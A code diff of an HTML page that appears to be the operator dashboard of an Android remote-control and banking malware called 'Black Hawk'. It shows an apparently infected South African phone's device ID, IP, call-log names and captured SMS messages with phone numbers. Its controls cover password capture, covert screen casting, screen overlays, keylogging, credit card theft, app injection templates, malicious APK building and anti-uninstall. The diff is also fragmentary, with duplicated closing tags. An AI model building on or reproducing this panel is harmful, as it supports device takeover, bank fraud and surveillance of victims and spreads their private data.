@@ -1,459 +1,64 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>黑鹰安卓远程后台 1:1</title>
-<style>
-:root{
-  --bg:#0b1118;
-  --bg2:#0e141c;
-  --panel:#111924;
-  --panel2:#0f1721;
-  --line:#2b3643;
-  --line2:#24303b;
-  --text:#d6dfeb;
-  --muted:#7b8a9d;
-  --blue:#2f74ff;
-  --blue2:#4a8eff;
-  --red:#e23146;
-  --red2:#ff5a6f;
-  --green:#10d48a;
-  --green2:#14ec9a;
-  --cyan:#52b3ff;
-  --purple:#d379ff;
-  --orange:#ff9f2e;
+#detail .topline .detail-server:hover{background:#193853}
+#listing .heading .righthead strong{color:#bccbe0;font-weight:500}
+#head-server-live{color:#21c989;border:1px solid #285244;border-radius:5px;background:#0d261d;padding:4px 8px;cursor:pointer;font-size:10px}
+/* 黑鹰控制台按钮优化 V2 */
+
+#detail .commands{
+    grid-template-columns:repeat(8,minmax(0,1fr));
+    gap:5px;
+    padding:8px;
 }
-*{box-sizing:border-box}
-html,body{height:100%}
-body{
-  margin:0;
-  background:var(--bg);
-  color:var(--text);
-  font-family:"Microsoft YaHei","PingFang SC",Arial,sans-serif;
-  overflow:hidden;
+
+#detail .commands button{
+    background:#2560df;
+    border:1px solid #4686f3;
+    color:#fff;
+    height:24px;
+    border-radius:5px;
+    font-size:10px;
+    overflow:hidden;
+    white-space:nowrap;
 }
-.app{height:100vh;padding:4px;display:flex;flex-direction:column;gap:6px}
-.topbar{
-  height:35px;
-  border:1px solid var(--line);
-  border-radius:9px;
-  background:#0d141d;
-  display:flex;
-  align-items:center;
-  gap:8px;
-  padding:0 10px;
-  white-space:nowrap;
-  overflow:hidden;
-  font-size:11px;
+
+#detail .commands button:hover{
+    background:#3479ef;
 }
-.device-title{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:700;color:#f0f5ff;margin-right:6px}
-.phone-ico{font-size:14px}
-.tag{height:20px;display:inline-flex;align-items:center;padding:0 8px;border-radius:6px;border:1px solid #2b3a4a;background:#111b26;color:#dbe6f5;flex-shrink:0}
-.tag.green{color:#1aec93;border-color:#135d46;background:#0c2d21}
-.tag.blue{color:#82bfff;border-color:#294f76;background:#11243a}
-.tag.red{color:#ff6379;border-color:#7b2a37;background:#2a1218}
-.tag.purple{color:#de8fff;border-color:#603176;background:#25142f}
-.tag.cyan{color:#61ddff;border-color:#205b6f;background:#0e2830}
-.top-meta{color:#b3c0d0;flex-shrink:0}
-.top-meta strong{color:#f0f6ff;font-weight:600}
-.top-meta .ok{color:#1dd98f}
-.top-meta .warn{color:#ff6777}
-.top-meta .ip{color:#3be18e}
-.top-input{
-  margin-left:auto;
-  width:118px;
-  height:23px;
-  border-radius:6px;
-  border:1px solid var(--line);
-  background:#0d1520;
-  color:#8c9bac;
-  padding:0 8px;
-  font-size:11px;
+
+#detail .commands button:disabled{
+    background:#111820;
+    border-color:#303b49;
+    color:#677586;
 }
-.main{flex:1;display:grid;grid-template-columns:46% 54%;gap:8px;min-height:0}
-.panel{
-  border:1px solid var(--line);
-  border-radius:12px;
-  background:#101720;
-  min-height:0;
-  display:flex;
-  flex-direction:column;
+
+#detail .topline{
+    height:37px;
+    display:flex;
+    align-items:center;
+    gap:6px;
+    overflow-x:auto;
+    white-space:nowrap;
 }
-.left{padding:10px}
-.screens{display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px;height:530px}
-.screen{
-  background:#000;
-  border:1px solid #202c37;
-  border-radius:12px;
-  position:relative;
-  overflow:hidden;
+
+#detail .topline .detail-mini{
+    background:#101923;
+    border:1px solid #304052;
+    color:#b9d7f5;
+    border-radius:5px;
+    padding:4px 7px;
 }
-.screen.center{background:#131820;display:flex;justify-content:center;align-items:flex-start;padding-top:16px}
-.placeholder{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#637285;font-size:16px}
-.phone-shot{
-  width:240px;height:528px;background:#f4f4f4;border-radius:4px;overflow:hidden;color:#222;box-shadow:0 0 0 1px #ddd;
+
+#detail .topline .detail-server{
+    background:#112439;
+    border-color:#245080;
+    color:#57aafc;
 }
-.phone-head{height:34px;display:flex;justify-content:space-between;align-items:center;padding:0 10px;font-size:11px;color:#444}
-.phone-body{padding:8px 14px}
-.phone-title{font-size:22px;font-weight:700;text-align:center;margin:20px 0 18px}
-.phone-actions{display:flex;justify-content:flex-end;gap:12px;color:#555;margin-bottom:10px}
-.call-list{display:flex;flex-direction:column;gap:0}
-.call-row{display:grid;grid-template-columns:18px 1fr auto;gap:8px;align-items:center;padding:9px 0;border-bottom:1px solid #ebebeb;font-size:12px}
-.call-row .name{font-size:13px;color:#333}
-.call-row .time{color:#7f7f7f;font-size:11px}
-.phone-nav{position:absolute;bottom:0;left:0;right:0;height:50px;border-top:1px solid #e5e5e5;background:#fafafa;display:grid;grid-template-columns:repeat(3,1fr);font-size:11px;color:#737373}
-.phone-nav div{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
-.quickbar{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:10px 6px 8px}
-.quick-left,.quick-mid,.quick-right{display:flex;align-items:center;gap:8px}
-.mini-btn,.icon-btn,.send-btn{
-  height:32px;border-radius:8px;border:1px solid #2f3e4f;background:#162231;color:#e8f0ff;font-size:11px;padding:0 12px;display:inline-flex;align-items:center;justify-content:center;gap:6px
-}
-.icon-btn{width:34px;padding:0;background:#131d29;font-size:15px;color:#b9c6d7}
-.quick-input{width:290px;height:32px;border-radius:8px;border:1px solid #2f3e4f;background:#0d1520;color:#d7e0ed;padding:0 10px;font-size:11px}
-.quick-input::placeholder{color:#79889a}
-.send-btn{background:#a92a38;border-color:#c04b58;color:#fff;padding:0 16px}
-.command-wrap{flex:1;display:flex;flex-direction:column;min-height:0}
-.commands{
-  flex:1;
-  border:1px solid #2a3643;
-  border-radius:10px;
-  background:#0c1118;
-  padding:8px;
-  display:grid;
-  grid-template-columns:repeat(4,1fr) 16px repeat(4,1fr);
-  grid-auto-rows:44px;
-  gap:8px;
-}
-.separator{grid-column:5;grid-row:1 / span 6;display:flex;justify-content:center}
-.separator::after{content:"";width:1px;background:#2e3b48;border-radius:1px}
-.cmd{
-  border-radius:8px;
-  border:1px solid #2f3e50;
-  background:#111924;
-  color:#6f7f93;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  text-align:center;
-  font-size:12px;
-  font-weight:600;
-  line-height:1.15;
-  padding:0 6px;
-}
-.cmd.blue{background:#2f74ff;border-color:#5b95ff;color:#fff}
-.cmd.red{background:#d82630;border-color:#ff4f5f;color:#fff}
-.cmd.greenline{
-  grid-column:1 / span 4;
-  background:#0d2a1e;
-  border-color:#167d57;
-  color:#1ee78f;
-  justify-content:flex-start;
-  padding-left:14px;
-  font-size:13px;
-}
-.right{padding:8px 10px 10px;min-width:0}
-.tabs{display:flex;gap:7px;align-items:center;flex-wrap:nowrap;overflow:hidden;padding-bottom:10px}
-.tab{height:31px;border-radius:8px;border:1px solid #2f3d4c;background:#121b26;color:#9db0c6;padding:0 12px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;white-space:nowrap}
-.tab.active{background:#2a1218;border-color:#883846;color:#ff6276}
-.content-box{flex:1;border:1px solid var(--line);border-radius:12px;background:#131a23;display:flex;flex-direction:column;min-height:0;overflow:hidden}
-.sms-head{display:flex;align-items:center;justify-content:space-between;padding:16px 16px 10px 16px}
-.sms-title{display:flex;align-items:center;gap:10px;font-size:14px;font-weight:700;color:#eef6ff}
-.sms-title .count{font-size:11px;color:#8f9fb3;background:#1f2935;border:1px solid #334355;border-radius:20px;padding:2px 8px}
-.sms-actions{display:flex;align-items:center;gap:8px}
-.search{width:200px;height:30px;border-radius:8px;border:1px solid #2f3d4c;background:#0e1621;color:#d7e3f0;padding:0 10px;font-size:12px}
-.action-btn{height:30px;border-radius:8px;border:1px solid #304050;background:#141d29;color:#d4deea;padding:0 12px;font-size:12px;display:inline-flex;align-items:center;gap:6px}
-.action-btn.green{background:#103320;border-color:#1a6c49;color:#24f09a}
-.action-btn.red{background:#32151a;border-color:#7f3943;color:#ff7687}
-.table-wrap{flex:1;overflow:auto;padding:0 16px}
-.table-wrap::-webkit-scrollbar{width:8px;height:8px}.table-wrap::-webkit-scrollbar-thumb{background:#2c3948;border-radius:8px}
-table{width:100%;border-collapse:collapse;table-layout:fixed}
-thead th{position:sticky;top:0;background:#131a23;color:#95a9bf;font-size:12px;text-align:left;padding:12px 8px;border-bottom:1px solid #273341;z-index:1}
-tbody td{padding:11px 8px;border-bottom:1px solid #222e3b;font-size:12px;color:#dde7f4;vertical-align:top}
-.col-num{width:118px;color:#f2f7ff;font-weight:600}
-.col-time{width:160px;color:#bac8d9;text-align:right}
-.sms-text{color:#d7e2ef;line-height:1.4}
-.footer{display:flex;align-items:center;justify-content:flex-end;gap:16px;padding:12px 16px;border-top:1px solid #273341;color:#9dafc4;font-size:12px}
-.footer select,.page-btn{height:30px;border-radius:8px;border:1px solid #2f3d4c;background:#131c28;color:#dbe6f2;padding:0 10px}
-.page-btn.active{background:#101722;border-color:#4e6075;color:#fff}
-.page-group{display:flex;align-items:center;gap:8px}
-.smallmuted{color:#77879a}
-</style>
-</head>
-<body>
-<div class="app">
-  <div class="topbar">
-    <div class="device-title"><span class="phone-ico">📱</span><span>SM-A057F</span></div>
-    <span class="tag green">在线</span>
-    <span class="tag blue">移动数据</span>
-    <span class="tag green">无障碍</span>
-    <span class="tag">锁屏</span>
-    <span class="tag green">SIM</span>
-    <span class="tag purple">管理员</span>
-    <span class="top-meta"><strong class="ok">76%</strong></span>
-    <span class="top-meta">南非时间 <strong id="saTime">10:48:43</strong> | 北京时间 <strong id="bjTime">16:48:43</strong></span>
-    <span class="top-meta">设备ID: <strong style="color:#63b7ff">ADB798AC9B777FCB</strong></span>
-    <span class="top-meta">系统 <strong style="color:#a68cff">Android 15</strong></span>
-    <span class="top-meta">IP: <strong class="ip">105.245.102.250 南非</strong></span>
-    <span class="top-meta">应用容许: <strong class="ip">6bd37d03fa7d8752ea36ba344bb79c5f34fd32577ef4696c36c49f96384d0da</strong></span>
-    <span class="top-meta">服务器延时: <strong class="warn">超时</strong></span>
-    <span class="top-meta">设备密钥: <strong class="warn">超时</strong></span>
-    <input class="top-input" placeholder="输入备注..." />
-  </div>
 
-  <div class="main">
-    <div class="panel left">
-      <div class="screens">
-        <div class="screen"><div class="placeholder">屏幕阅读未开启</div></div>
-        <div class="screen center">
-          <div class="phone-shot">
-            <div class="phone-head"><span>09:24</span><span>◔ ᯤ 76%</span></div>
-            <div class="phone-body">
-              <div class="phone-title">Phone</div>
-              <div class="phone-actions"><span>☰</span><span>⌕</span><span>⋮</span></div>
-              <div style="font-size:11px;color:#888;margin-bottom:6px;">Today</div>
-              <div class="call-list">
-                <div class="call-row"><span>📞</span><span class="name">Mandla Hlatjwayo (2)</span><span class="time">09:19</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Ps Msibi</span><span class="time">08:55</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Siyabonga</span><span class="time">08:25</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Babe Ben (3)</span><span class="time">08:17</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Mpumi Love</span><span class="time">08:02</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Ps Nkentshane</span><span class="time">08:00</span></div>
-                <div class="call-row"><span>📞</span><span class="name">Ps Edwin Makiwa</span><span class="time">07:42</span></div>
-              </div>
-            </div>
-            <div class="phone-nav">
-              <div><span>⌨</span><span>Keypad</span></div>
-              <div><span>🕘</span><span>Recents</span></div>
-              <div><span>👤</span><span>Contacts</span></div>
-            </div>
-          </div>
-        </div>
-        <div class="screen"><div class="placeholder">点击ADB投屏按钮开始</div></div>
-      </div>
-
-      <div class="quickbar">
-        <div class="quick-left">
-          <button class="mini-btn">🌐 同步翻译</button>
-          <button class="mini-btn">⌨ 虚拟键盘</button>
-        </div>
-        <div class="quick-mid">
-          <button class="icon-btn">🔔</button>
-          <button class="icon-btn">➤</button>
-          <button class="icon-btn">⌂</button>
-          <button class="icon-btn">▢</button>
-          <button class="icon-btn">⚙</button>
-        </div>
-        <div class="quick-right">
-          <input class="quick-input" placeholder="输入文本..." />
-          <button class="send-btn">发送</button>
-        </div>
-      </div>
-
-      <div class="command-wrap">
-        <div class="commands">
-          <div class="cmd blue">隐藏屏幕</div>
-          <div class="cmd blue">锁定屏幕</div>
-          <div class="cmd blue">开启阅读器</div>
-          <div class="cmd blue">阅读器设置</div>
-          <div class="separator"></div>
-          <div class="cmd blue">开启ADB模式</div>
-          <div class="cmd">开启无障碍</div>
-          <div class="cmd">关闭无障碍</div>
-          <div class="cmd">无障碍状态</div>
-
-          <div class="cmd blue">密码获取</div>
-          <div class="cmd blue">一键解锁</div>
-          <div class="cmd blue">亮度调暗</div>
-          <div class="cmd blue">开启静音</div>
-          <div class="cmd">黑屏遮挡</div>
-          <div class="cmd">取消黑屏</div>
-          <div class="cmd">开启勿扰</div>
-          <div class="cmd">关闭勿扰</div>
-
-          <div class="cmd red">无感投屏 ✓</div>
-          <div class="cmd">系统投屏</div>
-          <div class="cmd">ADB投屏</div>
-          <div class="cmd red">关闭投屏</div>
-          <div class="cmd">激活管理员</div>
-          <div class="cmd">移除管理员</div>
-          <div class="cmd">管理员状态</div>
-          <div class="cmd">至装APP</div>
-
-          <div class="cmd blue">黑屏遮挡</div>
-          <div class="cmd blue">系统更新</div>
-          <div class="cmd">阻断运作</div>
-          <div class="cmd">取消遮挡</div>
-          <div class="cmd">安装APP</div>
-          <div class="cmd">卸载APP</div>
-          <div class="cmd">启动APP</div>
-          <div class="cmd">同步设备ID</div>
-
-          <div class="cmd blue">投屏设置（标准）</div>
-          <div class="cmd red">关闭日志</div>
-          <div class="cmd red">关闭防卸载</div>
-          <div class="cmd blue">隐藏模式</div>
-          <div class="cmd">检查状态</div>
-          <div class="cmd">同步配置</div>
-          <div class="cmd">重启连接</div>
-          <div class="cmd">重启FRPC</div>
-
-          <div class="cmd blue">植入ADB</div>
-          <div class="cmd blue">重启ADB</div>
-          <div class="cmd blue">无线配对</div>
-          <div class="cmd blue">至装投屏</div>
-          <div class="cmd">安全设置</div>
-          <div class="cmd">写入权限</div>
-          <div class="cmd blue">敏感App</div>
-          <div class="cmd blue">安全App</div>
-
-          <div class="cmd greenline">● 当前投屏: 无感投屏</div>
-        </div>
-      </div>
-    </div>
-
-    <div class="panel right">
-      <div class="tabs">
-        <div class="tab">AI分析</div>
-        <div class="tab">密码记录</div>
-        <div class="tab">支付捕获</div>
-        <div class="tab active">短信</div>
-        <div class="tab">键盘日志</div>
-        <div class="tab">信用卡数据</div>
-        <div class="tab">摄像/麦克风</div>
-        <div class="tab">相册</div>
-        <div class="tab">文件</div>
-        <div class="tab">应用/注入</div>
-        <div class="tab">通讯录</div>
-        <div class="tab">权限</div>
-        <div class="tab">群发功能</div>
-      </div>
-
-      <div class="content-box">
-        <div class="sms-head">
-          <div class="sms-title">📱 短信 <span class="count">106 条</span></div>
-          <div class="sms-actions">
-            <input class="search" placeholder="搜索发送方/内容..." />
-            <button class="action-btn green">📲 获取短信</button>
-            <button class="action-btn">☆ 翻译本页</button>
-            <button class="action-btn">⇩ 导出</button>
-            <button class="action-btn">⟳</button>
-            <button class="action-btn red">🗑 清空</button>
-          </div>
-        </div>
-
-        <div class="table-wrap">
-          <table>
-            <thead>
-              <tr>
-                <th class="col-num">号码</th>
-                <th>内容</th>
-                <th class="col-time">时间</th>
-              </tr>
-            </thead>
-            <tbody>
-              <tr>
-                <td class="col-num">+27720273621</td>
-                <td class="sms-text">Good evening brothers that training in Mangweni is on as usual time to start 8 am until 16:00 pm food and refreshments is available. So Selby be ready in the mrng and Nicholas Msibi also and Bandile I will be at Tonga by 07:30 thanx brothers</td>
-                <td class="col-time">2026/10/14 04:21:27</td>
-              </tr>
-              <tr>
-                <td class="col-num">+2782005076214109</td>
-                <td class="sms-text">Hi Mduduzi, use your R4,163 to shop the Truworths REAL SALE on selected Ladies, Mens &amp; Kids fashion! Starts Wed 14 Oct @12pm, in-store + online. Stop=Optout</td>
-                <td class="col-time">2026/10/13 22:54:30</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">You've used 11.8 VodaBucks. To view your VodaBucks balance, visit VodaPay: https://vodapay.go.link/bruaw or dial *133#. T&amp;Cs.</td>
-                <td class="col-time">2026/10/13 18:15:28</td>
-              </tr>
-              <tr>
-                <td class="col-num">+2782005076160288</td>
-                <td class="sms-text">Good news! Old Mutual iWYZE wants to help you lower your car insurance premium. Reply YES for a FREE quote. NO=Opt-out. FSP &amp; Ins. Ts&amp;Cs. AL</td>
-                <td class="col-time">2026/10/13 16:36:04</td>
-              </tr>
-              <tr>
-                <td class="col-num">VODACOM15</td>
-                <td class="sms-text">Your bundle has been activated and is valid until 2026-10-13 at 23:59:59.</td>
-                <td class="col-time">2026/10/13 15:32:34</td>
-              </tr>
-              <tr>
-                <td class="col-num">Voda Alerts</td>
-                <td class="sms-text">Your 100 Voda min Vodacom bundle is now active and will be valid until 23:59:59 today.</td>
-                <td class="col-time">2026/10/13 06:23:10</td>
-              </tr>
-              <tr>
-                <td class="col-num">+27791829289</td>
-                <td class="sms-text">Call me from LOVE - (AD) GameZAR fun starts! Dial *148*49# &amp; you could WIN R5 instantly. R3/day. Ts&amp;Cs Apply.</td>
-                <td class="col-time">2026/10/12 20:34:39</td>
-              </tr>
-              <tr>
-                <td class="col-num">Voda Alerts</td>
-                <td class="sms-text">Your 100 Voda min Vodacom bundle is now active and will be valid until 23:59:59 today.</td>
-                <td class="col-time">2026/10/12 14:14:11</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">Vodacom: A reminder that your YouTube bundle expires on 2026-10-15 23:59. Want to buy a new bundle? Dial *135# or visit https://vodapay.go.link/eJ0wb</td>
-                <td class="col-time">2026/10/12 12:17:26</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">Vodacom: Well Done! You've earned 3.9 VodaBucks. T&amp;Cs apply.</td>
-                <td class="col-time">2026/10/11 13:54:42</td>
-              </tr>
-              <tr>
-                <td class="col-num">+27769861898</td>
-                <td class="sms-text">Call me from +27769861898 - (AD) Set AMA BUFFALO NAMA ELEPHANT as your Ringback Tone &amp; you could WIN! R3/day. Ts&amp;Cs Apply.</td>
-                <td class="col-time">2026/10/10 23:54:40</td>
-              </tr>
-              <tr>
-                <td class="col-num">+27769745916</td>
-                <td class="sms-text">Call me from Iencan - (AD) Make your Fantasy Dribble picks! Dial *148*105# to join &amp; WIN R5 instantly. R5/day. Ts&amp;Cs Apply.</td>
-                <td class="col-time">2026/10/10 19:56:26</td>
-              </tr>
-              <tr>
-                <td class="col-num">Vodacom</td>
-                <td class="sms-text">Heads up! You have less than 48 minutes left of your VC-VC Anytime balance on 0794440751. To top up, dial *123# and select 'Voice' or visit the Vodapay App https://vodapay.go.link/e5j6.</td>
-                <td class="col-time">2026/10/10 01:28:13</td>
-              </tr>
-            </tbody>
-          </table>
-        </div>
-
-        <div class="footer">
-          <span>每页行数</span>
-          <select>
-            <option selected>50</option>
-            <option>100</option>
-          </select>
-          <span>1-50 / 共 106</span>
-          <div class="page-group">
-            <button class="page-btn active">1</button>
-            <button class="page-btn">2</button>
-            <button class="page-btn">3</button>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<script>
-(function(){
-  function pad(n){return String(n).padStart(2,'0');}
-  function updateClocks(){
-    const now = new Date();
-    const bj = new Date(now.toLocaleString('en-US',{timeZone:'Asia/Shanghai'}));
-    const sa = new Date(now.toLocaleString('en-US',{timeZone:'Africa/Johannesburg'}));
-    const bjText = pad(bj.getHours())+':'+pad(bj.getMinutes())+':'+pad(bj.getSeconds());
-    const saText = pad(sa.getHours())+':'+pad(sa.getMinutes())+':'+pad(sa.getSeconds());
-    document.getElementById('bjTime').textContent = bjText;
-    document.getElementById('saTime').textContent = saText;
-  }
-  updateClocks();
-  setInterval(updateClocks,1000);
-})();
-</script>
-</body>
-</html>
+.device-mgmt-row button{
+    background:#1a3555;
+    border:1px solid #36639c;
+    color:#b4d9ff;
+}</style></head><body>
+</style></head><body>
+<aside class="side" id="sidebar"><div class="brand"><span class="eagle">🦅</span>黑鹰安卓远程</div><button><span class="ico">⌂</span>控制台</button><div class="group-title">数据管理</div><button class="active"><span class="ico">▣</span>设备</button><button><span class="ico">▤</span>短信</button><button><span class="ico">♧</span>通知</button><button><span class="ico">▭</span>银行卡</button><button><span class="ico">▣</span>注入数据</button><div class="group-title">设备管理</div><button><span class="ico">♧</span>分组管理　⌄</button><button><span class="ico">⊘</span>黑名单</button><div class="group-title">注入策略</div><button><span class="ico">◎</span>应用设置</button><button><span class="ico">♢</span>注入模板</button><button><span class="ico">✣</span>AI制作模板</button><button><span class="ico">♧</span>短信通知规则</button><button><span class="ico">▤</span>银行检测配置</button><div class="group-title">构建分发</div><button><span class="ico">⚒</span>APK构建</button><div class="group-title">系统设置</div><button><span class="ico">♙</span>用户设置</button><button><span class="ico">♢</span>安全中心</button><button><span class="ico">▤</span>服务器状态</button><button><span class="ico">⌁</span>TURN节点</button><button><span class="ico">▤</span>Telegram设置</button><div class="bottom"><span class="dot">●</span> 系统运行中　v2.0</div></aside>
+<main class="viewport" id="main">
+<div id="listing"><div class="heading"><div class="path">◫　设备管理</div><div class="righthead"><div class="field">金额</div><div class="field">越南盾 VND⌄</div><b>=　0.00</b><div class="field">美元 USD⌄</div><div class="field slim">南非⌄</div><span>南非时间: <strong id="clock-sa">--:--:--</strong></span><span>|</span><span>北京时间: <strong id="clock-bj">--:--:--</strong></span><span class="topicon">⟳</span><button class="header-server" id="head-server-live" type="button" title="查看服务器/IP">● 服务器检测中</button><span class="topicon">🦅</span></div></div>
